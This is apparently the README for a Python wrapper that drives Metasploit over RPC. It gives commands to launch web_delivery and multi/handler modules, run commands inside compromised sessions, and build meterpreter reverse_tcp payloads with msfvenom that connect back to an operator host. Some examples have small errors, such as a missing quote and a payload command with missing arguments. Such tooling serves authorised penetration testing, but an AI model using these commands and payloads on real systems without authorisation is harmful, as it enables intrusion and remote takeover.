# Metasploit RPC Automation Tool

This Python script is designed to interact with the Metasploit Framework using the `pymetasploit3` library, allowing for automation of tasks such as running exploits, polling jobs and sessions, accessing sessions, and generating payloads using `msfvenom`.

## Features

- **Run any Metasploit module:** Execute exploits, payloads, or any module and get the output.
- **Poll active jobs:** List all currently active jobs in the Metasploit instance.
- **Poll active sessions:** List all currently active sessions.
- **Access a session and run a command:** Interact with an active Metasploit session and run commands inside it.
- **Generate payloads using msfvenom:** Create payloads in various formats with `msfvenom`.

## Requirements

- Python 3.x
- Metasploit installed and configured
- `pymetasploit3` library for interacting with the Metasploit RPC server
- `configparser` for managing configuration settings
- `argparse` for parsing command-line arguments

## Installation

1. Clone the repository:

    ```bash
    git clone https://github.com/your-repo/metasploit-rpc-tool.git
    ```

2. Install the required dependencies:

    ```bash
    pip install pymetasploit3
    ```

3. Ensure that your Metasploit instance is running, and the Metasploit RPC server is enabled.

4. Configure the `config.ini` file (see below).

## Configuration

The tool reads the default configurations from a `config.ini` file. An example `config.ini` is provided below.

### Example `config.ini`:

```ini
[default]
# Global default settings for RPC connection
msf_password = msfrpc
rpc_server = 127.0.0.1
rpc_port = 55552
rpc_ssl = False

# Default regex for filtering exploit output
regex = Run the following command on the target machine:\n(.*)

[run_module]
# Default options for running Metasploit modules
module = exploit/multi/script/web_delivery
option1 = LHOST=192.168.1.100
option2 = LPORT=4444
regex = Run the following command on the target machine:\n(.*)

[poll_jobs]
# No additional settings needed for polling jobs

[poll_sessions]
# No additional settings needed for polling sessions

[run_command]
session_id = 1
session_command = sysinfo

[generate_payload]
format = exe
payload = windows/meterpreter/reverse_tcp
lhost = 192.168.1.100
lport = 4444
output_file = /tmp/payload.exe
```

## Usage

### General Structure

```bash
python ryotenkai.py <command> [options]
```

### Commands

- **`run_module`**: Runs a specified Metasploit module and retrieves the output.

    ```bash
    python ryotenkai.py run_module <module_name> --option OPTION1=VALUE --option OPTION2=VALUE --regex <regex_pattern>
    ```

    Example:

    ```bash
    python ryotenkai.py run_module multi/handler \
    --option 'PAYLOAD linux/x64/meterpreter/reverse_tcp \
    --option 'LHOST 10.192.0.3' \
    --option 'LPORT 12344' \
    --option 'ExitOnSession false' \
    --msf-password msfrpc \
    --rpc-port 55556 \
    --rpc-server 10.192.0.3 \
    --rpc-ssl

    ```

- **`get_jobs`**: Polls for active Metasploit jobs.

    ```bash
    python3 ryotenkai.py get_jobs
    ```

- **`get_sessions`**: Polls for active Metasploit sessions.

    ```bash
    python3 ryotenkai.py get_sessions
    ```

- **`run_command`**: Accesses a Metasploit session and runs a command within the session.

    ```bash
    python3 ryotenkai.py run_command <session_id> <command>
    ```

    Example:

    ```bash
    python3 ryotenkai.py run_command 1 sysinfo
    ```

- **`generate_payload`**: Generates a payload using `msfvenom`.

    ```bash
    python3 ryotenkai.py generate_payload <format> <payload> <lhost> <lport> <output_file>
    ```

    Example:

    ```bash
    python3 ryotenkai.py generate_payload exe windows/meterpreter/reverse_tcp 192.168.1.100 4444 /tmp/payload.exe
    ```

### Configuration Overrides

Command-line arguments provided when running the tool will override values in the `config.ini` file. For example:

```bash
python ryotenkai.py run_module exploit/multi/script/web_delivery \
--option 'LHOST 192.168.1.50' 
--option 'LPORT 8080'
```

Will override the `LHOST` and `LPORT` values set in `config.ini`.

## Logging

The script uses Python's logging module to provide detailed information about the operations being performed. The log level is set to `INFO` by default but can be adjusted within the script for more verbose output.


## Example Usage Case
1. Create your config.ini
2. Run the following command to generate an elf payload
```bash
python3 ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp payload.sh 
```
3. 

## License

This project is licensed under the MIT License. See the LICENSE file for more information.
